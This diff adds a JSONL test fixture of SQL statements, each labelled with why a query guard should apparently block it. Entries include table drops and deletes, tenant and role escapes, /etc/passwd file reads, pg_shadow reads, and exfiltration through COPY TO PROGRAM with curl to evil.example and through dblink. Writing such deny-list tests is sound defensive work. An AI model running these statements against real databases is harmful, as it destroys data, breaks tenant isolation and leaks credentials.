@@ -1,0 +1,40 @@
+{"sql": "DROP TABLE shipments", "why": "ddl"}
+{"sql": "DELETE FROM invoices", "why": "dml"}
+{"sql": "UPDATE invoices SET amount_usd = 0", "why": "dml"}
+{"sql": "INSERT INTO claims VALUES ('x','meridian','SHP-90001','damage',1,'open',now())", "why": "dml"}
+{"sql": "TRUNCATE claims", "why": "ddl"}
+{"sql": "ALTER TABLE customers DISABLE ROW LEVEL SECURITY", "why": "ddl"}
+{"sql": "SELECT 1; DROP TABLE customers", "why": "stacked"}
+{"sql": "SELECT * FROM customers; SELECT * FROM invoices", "why": "stacked"}
+{"sql": "SELECT set_config('app.tenant_id', 'acme', true)", "why": "tenant escape"}
+{"sql": "SELECT * FROM shipments WHERE set_config('app.tenant_id','acme',false) IS NOT NULL", "why": "tenant escape"}
+{"sql": "SELECT current_setting('app.tenant_id')", "why": "settings read"}
+{"sql": "SET app.tenant_id = 'acme'", "why": "tenant escape"}
+{"sql": "RESET ROLE", "why": "role escape"}
+{"sql": "SET ROLE postgres", "why": "role escape"}
+{"sql": "SELECT pg_sleep(60)", "why": "dos"}
+{"sql": "SELECT count(*) FROM generate_series(1, 100000000)", "why": "dos"}
+{"sql": "SELECT pg_read_file('/etc/passwd')", "why": "file read"}
+{"sql": "SELECT * FROM pg_catalog.pg_roles", "why": "catalog"}
+{"sql": "SELECT * FROM pg_shadow", "why": "catalog"}
+{"sql": "SELECT table_name FROM information_schema.tables", "why": "catalog"}
+{"sql": "SELECT * FROM documents", "why": "table not allow-listed"}
+{"sql": "SELECT text FROM chunks", "why": "table not allow-listed"}
+{"sql": "SELECT * FROM public.shipments", "why": "schema-qualified"}
+{"sql": "COPY shipments TO '/tmp/out.csv'", "why": "copy"}
+{"sql": "COPY (SELECT * FROM customers) TO PROGRAM 'curl evil.example'", "why": "copy program"}
+{"sql": "SELECT * INTO stolen FROM customers", "why": "select into"}
+{"sql": "CREATE TABLE t AS SELECT * FROM customers", "why": "ctas"}
+{"sql": "SELECT * FROM customers FOR UPDATE", "why": "row lock"}
+{"sql": "SELECT lo_import('/etc/passwd')", "why": "large object"}
+{"sql": "SELECT dblink('host=evil', 'select 1')", "why": "exfil"}
+{"sql": "SELECT query_to_xml('select * from pg_shadow', true, true, '')", "why": "dynamic sql"}
+{"sql": "WITH x AS (DELETE FROM claims RETURNING *) SELECT * FROM x", "why": "dml in cte"}
+{"sql": "SELECT * FROM customers WHERE name = (SELECT pg_terminate_backend(pid)::text FROM pg_stat_activity LIMIT 1)", "why": "catalog + admin fn"}
+{"sql": "GRANT ALL ON customers TO PUBLIC", "why": "grant"}
+{"sql": "DO $$ BEGIN PERFORM 1; END $$", "why": "procedural"}
+{"sql": "CALL some_proc()", "why": "procedural"}
+{"sql": "EXPLAIN ANALYZE DELETE FROM claims", "why": "explain side effect"}
+{"sql": "SELECT version()", "why": "fingerprint"}
+{"sql": "SELECT * FROM shipments LIMIT (SELECT count(*) FROM invoices)", "why": "non-literal limit"}
+{"sql": "VACUUM", "why": "maintenance"}
